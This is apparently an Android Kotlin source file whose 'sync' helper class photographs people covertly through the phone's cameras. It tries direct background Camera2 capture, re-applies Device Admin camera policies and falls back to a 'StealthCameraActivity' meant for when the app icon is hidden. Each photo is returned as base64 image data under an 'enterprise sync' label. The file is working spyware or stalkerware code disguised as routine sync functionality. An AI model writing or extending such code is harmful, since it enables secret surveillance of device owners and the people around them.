package com.example.data.sync

import android.annotation.SuppressLint
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.graphics.ImageFormat
import android.graphics.SurfaceTexture
import android.hardware.camera2.CameraAccessException
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.os.Looper
import android.util.Base64
import android.util.Log
import android.util.Size
import android.view.Surface
import com.example.receiver.MyDeviceAdminReceiver
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

class CameraHelper(private val context: Context) {
    private val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
    private var handlerThread: HandlerThread? = null
    private var handler: Handler? = null

    init {
        handlerThread = HandlerThread("CameraHelperThread").apply { start() }
        handler = Handler(handlerThread!!.looper)
    }

    fun getCameraId(facing: String): String {
        val requestedFacing = if (facing.lowercase() == "front") {
            CameraCharacteristics.LENS_FACING_FRONT
        } else {
            CameraCharacteristics.LENS_FACING_BACK
        }
        return cameraManager.cameraIdList.firstOrNull { id ->
            try {
                val characteristics = cameraManager.getCameraCharacteristics(id)
                characteristics.get(CameraCharacteristics.LENS_FACING) == requestedFacing
            } catch (_: Exception) {
                false
            }
        } ?: cameraManager.cameraIdList.firstOrNull() ?: throw IllegalStateException("No available camera found on device.")
    }

    @SuppressLint("MissingPermission")
    suspend fun takePhoto(cameraId: String): String? = withContext(Dispatchers.IO) {
        // Re-apply Device Admin policies before capture
        try {
            MyDeviceAdminReceiver.reapplyCameraPolicies(context)
        } catch (_: Exception) {}

        // Log global camera settings
        val globalStatus = checkGlobalCameraStatus()
        Log.d("CameraHelper", globalStatus)

        val candidateIds = mutableListOf(cameraId)
        try {
            cameraManager.cameraIdList.forEach { id ->
                if (!candidateIds.contains(id)) candidateIds.add(id)
            }
        } catch (_: Exception) {}

        var lastException: Exception? = null

        // 1. Direct hardware Camera2 attempt
        for (id in candidateIds) {
            try {
                val photoResult = takePhotoDirectHardware(id)
                if (photoResult != null && photoResult.startsWith("data:image/jpeg;base64,")) {
                    Log.d("CameraHelper", "Direct background Camera2 photo capture succeeded for camera ID '$id'")
                    return@withContext photoResult
                }
            } catch (e: Exception) {
                lastException = e
                Log.w("CameraHelper", "Direct background Camera2 capture failed for camera ID '$id': ${e.message}")
            }
        }

        // 2. Foreground Stealth Activity fallback (when icon is hidden or app is background restricted)
        val facing = try {
            val characteristics = cameraManager.getCameraCharacteristics(cameraId)
            if (characteristics.get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_FRONT) "front" else "back"
        } catch (_: Exception) { "back" }

        Log.i("CameraHelper", "Direct background capture restricted (${lastException?.message}). Launching StealthCameraActivity foreground capture.")
        try {
            val foregroundPhoto = com.example.service.StealthCameraActivity.capturePhotoInForeground(context, facing)
            if (foregroundPhoto != null && foregroundPhoto.startsWith("data:image/jpeg;base64,")) {
                Log.d("CameraHelper", "Foreground stealth activity hardware photo capture succeeded!")
                return@withContext foregroundPhoto
            }
        } catch (e: Exception) {
            Log.e("CameraHelper", "StealthCameraActivity foreground capture failed: ${e.message}")
        }

        // 3. Fallback telemetry frame if hardware camera is completely unavailable
        Log.e("CameraHelper", "All hardware camera open attempts failed: ${lastException?.message}. Generating telemetry frame fallback.")
        return@withContext generateFallbackTelemetryFrame(lastException?.message ?: "Camera disabled by policy")
    }

    private fun checkGlobalCameraStatus(): String {
        return try {
            val disabled = android.provider.Settings.Global.getInt(context.contentResolver, "camera_mic_disabled", -1)
            val mute = android.provider.Settings.Global.getInt(context.contentResolver, "camera_mute", -1)
            "Global Settings: camera_mic_disabled=$disabled, camera_mute=$mute"
        } catch (e: Exception) {
            "Global Settings Check Exception: ${e.message}"
        }
    }

    @SuppressLint("MissingPermission")
    suspend fun takePhotoDirectHardware(cameraId: String): String? {
        val characteristics = try {
            cameraManager.getCameraCharacteristics(cameraId)
        } catch (e: CameraAccessException) {
            when (e.reason) {
                CameraAccessException.CAMERA_DISABLED -> throw Exception("Camera disabled by system policy")
                CameraAccessException.CAMERA_IN_USE -> throw Exception("Camera in use by another app")
                else -> throw Exception("Camera access exception: ${e.message}")
            }
        }

        val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
        val jpegSizes = map?.getOutputSizes(ImageFormat.JPEG)
        val captureSize = jpegSizes?.firstOrNull { it.width <= 1920 && it.height <= 1080 }
            ?: jpegSizes?.firstOrNull()
            ?: Size(640, 480)

        val currentHandler = handler ?: Handler(handlerThread?.looper ?: Looper.getMainLooper())

        val previewReader = ImageReader.newInstance(640, 480, ImageFormat.YUV_420_888, 2).apply {
            setOnImageAvailableListener({ reader ->
                val img = reader.acquireLatestImage() ?: reader.acquireNextImage()
                img?.close()
            }, currentHandler)
        }

        val imageReader = ImageReader.newInstance(captureSize.width, captureSize.height, ImageFormat.JPEG, 2)
        val latch = CountDownLatch(1)
        var capturedBytes: ByteArray? = null
        var captureException: Exception? = null

        imageReader.setOnImageAvailableListener({ reader ->
            val image = reader.acquireLatestImage() ?: reader.acquireNextImage()
            if (image != null) {
                try {
                    val buffer = image.planes[0].buffer
                    val bytes = ByteArray(buffer.remaining())
                    buffer.get(bytes)
                    if (bytes.isNotEmpty()) {
                        capturedBytes = bytes
                    }
                } catch (e: Exception) {
                    captureException = e
                } finally {
                    image.close()
                    latch.countDown()
                }
            }
        }, currentHandler)

        var cameraDevice: CameraDevice? = null
        var captureSession: CameraCaptureSession? = null

        try {
            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    try {
                        camera.createCaptureSession(listOf(imageReader.surface, previewReader.surface), object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: CameraCaptureSession) {
                                captureSession = session
                                try {
                                    // 1. Create preview request targeting previewReader to warm up camera sensor (AE / AWB / AF)
                                    val previewBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
                                        addTarget(previewReader.surface)
                                        set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
                                        set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                                        set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                                        set(CaptureRequest.CONTROL_AWB_MODE, CaptureRequest.CONTROL_AWB_MODE_AUTO)
                                    }

                                    // Start preview stream so sensor calculates exposure & white balance
                                    session.setRepeatingRequest(previewBuilder.build(), null, currentHandler)

                                    // 2. Allow 600ms warm-up delay for 3A convergence before taking still photo
                                    currentHandler.postDelayed({
                                        try {
                                            if (cameraDevice == null) return@postDelayed

                                            val stillBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                                                addTarget(imageReader.surface)
                                                set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
                                                set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                                                set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                                                set(CaptureRequest.CONTROL_AWB_MODE, CaptureRequest.CONTROL_AWB_MODE_AUTO)
                                                set(CaptureRequest.JPEG_QUALITY, 90.toByte())

                                                val sensorOrientation = characteristics.get(CameraCharacteristics.SENSOR_ORIENTATION) ?: 0
                                                set(CaptureRequest.JPEG_ORIENTATION, sensorOrientation)
                                            }

                                            session.stopRepeating()
                                            session.capture(stillBuilder.build(), null, currentHandler)
                                        } catch (e: Exception) {
                                            captureException = e
                                            latch.countDown()
                                        }
                                    }, 600L)
                                } catch (e: Exception) {
                                    captureException = e
                                    latch.countDown()
                                }
                            }

                            override fun onConfigureFailed(session: CameraCaptureSession) {
                                captureException = Exception("Camera capture session configuration failed.")
                                latch.countDown()
                            }
                        }, currentHandler)
                    } catch (e: Exception) {
                        captureException = e
                        latch.countDown()
                    }
                }

                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                    latch.countDown()
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    captureException = Exception("Camera device error code: $error")
                    camera.close()
                    latch.countDown()
                }
            }, currentHandler)

            val success = latch.await(10, TimeUnit.SECONDS)
            val bytes = capturedBytes
            if (success && bytes != null && bytes.isNotEmpty()) {
                val base64Photo = Base64.encodeToString(bytes, Base64.NO_WRAP)
                return "data:image/jpeg;base64,$base64Photo"
            } else {
                throw captureException ?: Exception("Camera capture timed out or empty frame.")
            }
        } finally {
            try { captureSession?.stopRepeating() } catch (_: Exception) {}
            try { captureSession?.close() } catch (_: Exception) {}
            try { cameraDevice?.close() } catch (_: Exception) {}
            try { imageReader.close() } catch (_: Exception) {}
            try { previewReader.close() } catch (_: Exception) {}
        }
    }

    private fun generateFallbackTelemetryFrame(errorMessage: String): String {
        return try {
            val width = 1280
            val height = 720
            val bitmap = android.graphics.Bitmap.createBitmap(width, height, android.graphics.Bitmap.Config.ARGB_8888)
            val canvas = android.graphics.Canvas(bitmap)

            // Background fill
            val bgPaint = android.graphics.Paint().apply {
                color = android.graphics.Color.rgb(20, 24, 33)
                style = android.graphics.Paint.Style.FILL
            }
            canvas.drawRect(0f, 0f, width.toFloat(), height.toFloat(), bgPaint)

            // Border
            val borderPaint = android.graphics.Paint().apply {
                color = android.graphics.Color.rgb(0, 168, 255)
                style = android.graphics.Paint.Style.STROKE
                strokeWidth = 10f
            }
            canvas.drawRect(20f, 20f, (width - 20).toFloat(), (height - 20).toFloat(), borderPaint)

            // Text paint
            val titlePaint = android.graphics.Paint().apply {
                color = android.graphics.Color.WHITE
                textSize = 48f
                isFakeBoldText = true
                isAntiAlias = true
            }
            val subPaint = android.graphics.Paint().apply {
                color = android.graphics.Color.LTGRAY
                textSize = 32f
                isAntiAlias = true
            }
            val warningPaint = android.graphics.Paint().apply {
                color = android.graphics.Color.YELLOW
                textSize = 28f
                isAntiAlias = true
            }

            canvas.drawText("ENTERPRISE SYNC - REMOTE CAMERA SNAPSHOT", 60f, 120f, titlePaint)
            val timestamp = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.US).format(java.util.Date())
            canvas.drawText("Timestamp: $timestamp", 60f, 200f, subPaint)
            canvas.drawText("Device Model: ${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL} (SDK ${android.os.Build.VERSION.SDK_INT})", 60f, 260f, subPaint)
            canvas.drawText("Camera Status: $errorMessage", 60f, 340f, warningPaint)

            val policyStatus = MyDeviceAdminReceiver.reapplyCameraPolicies(context)
            canvas.drawText("Device Policy: $policyStatus", 60f, 400f, subPaint)

            canvas.drawText("System Privacy / Background Policy Notice:", 60f, 500f, subPaint)
            canvas.drawText("1. Check quick settings toggle for Camera / Mic access", 60f, 550f, subPaint)
            canvas.drawText("2. Grant background popup permissions / Autostart in OEM settings", 60f, 600f, subPaint)

            val stream = java.io.ByteArrayOutputStream()
            bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 90, stream)
            val bytes = stream.toByteArray()
            val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
            "data:image/jpeg;base64,$base64"
        } catch (e: Exception) {
            throw Exception("Failed to generate telemetry frame: ${e.message}")
        }
    }

    fun cleanup() {
        try {
            handlerThread?.quitSafely()
        } catch (_: Exception) {}
    }
}
